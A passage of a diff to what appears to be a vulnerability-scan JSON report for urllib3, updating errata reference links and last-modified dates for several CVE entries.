             "https://access.redhat.com/errata/RHSA-2026:4185",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
             "https://access.redhat.com/errata/RHSA-2026:4215",
             "https://access.redhat.com/errata/RHSA-2026:4271",
             "https://access.redhat.com/errata/RHSA-2026:4466",
@@ -3106,7 +3216,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66418",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66471",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-21441",
-            "https://errata.almalinux.org/10/ALSA-2026-1086.html",
+            "https://errata.almalinux.org/9/ALSA-2026-1239.html",
             "https://errata.rockylinux.org/RLSA-2026:1087",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/commit/8864ac407bba8607950025e0979c4c69bc7abc7b",
@@ -3122,7 +3232,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-21441"
           ],
           "PublishedDate": "2026-01-07T22:15:44.04Z",
-          "LastModifiedDate": "2026-07-20T12:17:57.27Z"
+          "LastModifiedDate": "2026-07-21T12:17:21.563Z"
         },
         {
           "VulnerabilityID": "CVE-2026-21441",
@@ -3280,6 +3390,7 @@
             "https://access.redhat.com/errata/RHSA-2026:3884",
             "https://access.redhat.com/errata/RHSA-2026:3960",
             "https://access.redhat.com/errata/RHSA-2026:4185",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
             "https://access.redhat.com/errata/RHSA-2026:4215",
             "https://access.redhat.com/errata/RHSA-2026:4271",
             "https://access.redhat.com/errata/RHSA-2026:4466",
@@ -3300,7 +3411,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66418",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-66471",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-21441",
-            "https://errata.almalinux.org/10/ALSA-2026-1086.html",
+            "https://errata.almalinux.org/9/ALSA-2026-1239.html",
             "https://errata.rockylinux.org/RLSA-2026:1087",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/commit/8864ac407bba8607950025e0979c4c69bc7abc7b",
@@ -3316,7 +3427,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-21441"
           ],
           "PublishedDate": "2026-01-07T22:15:44.04Z",
-          "LastModifiedDate": "2026-07-20T12:17:57.27Z"
+          "LastModifiedDate": "2026-07-21T12:17:21.563Z"
         },
         {
           "VulnerabilityID": "CVE-2026-44431",
@@ -3374,7 +3485,7 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:28000",
+            "https://access.redhat.com/errata/RHSA-2026:28159",
             "https://access.redhat.com/security/cve/CVE-2026-44431",
             "https://bugzilla.redhat.com/2477154",
             "https://bugzilla.redhat.com/2477167",
@@ -3382,7 +3493,7 @@
             "https://bugzilla.redhat.com/show_bug.cgi?id=2477167",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-44431",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-44432",
-            "https://errata.almalinux.org/10/ALSA-2026-28000.html",
+            "https://errata.almalinux.org/9/ALSA-2026-28159.html",
             "https://errata.rockylinux.org/RLSA-2026:28158",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/security/advisories/GHSA-qccp-gfcp-xxvc",
@@ -3452,7 +3563,7 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:28000",
+            "https://access.redhat.com/errata/RHSA-2026:28159",
             "https://access.redhat.com/security/cve/CVE-2026-44431",
             "https://bugzilla.redhat.com/2477154",
             "https://bugzilla.redhat.com/2477167",
@@ -3460,7 +3571,7 @@
             "https://bugzilla.redhat.com/show_bug.cgi?id=2477167",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-44431",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-44432",
-            "https://errata.almalinux.org/10/ALSA-2026-28000.html",
+            "https://errata.almalinux.org/9/ALSA-2026-28159.html",
             "https://errata.rockylinux.org/RLSA-2026:28158",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/security/advisories/GHSA-qccp-gfcp-xxvc",
@@ -3530,7 +3641,7 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:28000",
+            "https://access.redhat.com/errata/RHSA-2026:28159",
             "https://access.redhat.com/security/cve/CVE-2026-44431",
             "https://bugzilla.redhat.com/2477154",
             "https://bugzilla.redhat.com/2477167",
@@ -3538,7 +3649,7 @@
             "https://bugzilla.redhat.com/show_bug.cgi?id=2477167",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-44431",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-44432",
-            "https://errata.almalinux.org/10/ALSA-2026-28000.html",
+            "https://errata.almalinux.org/9/ALSA-2026-28159.html",
             "https://errata.rockylinux.org/RLSA-2026:28158",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/security/advisories/GHSA-qccp-gfcp-xxvc",
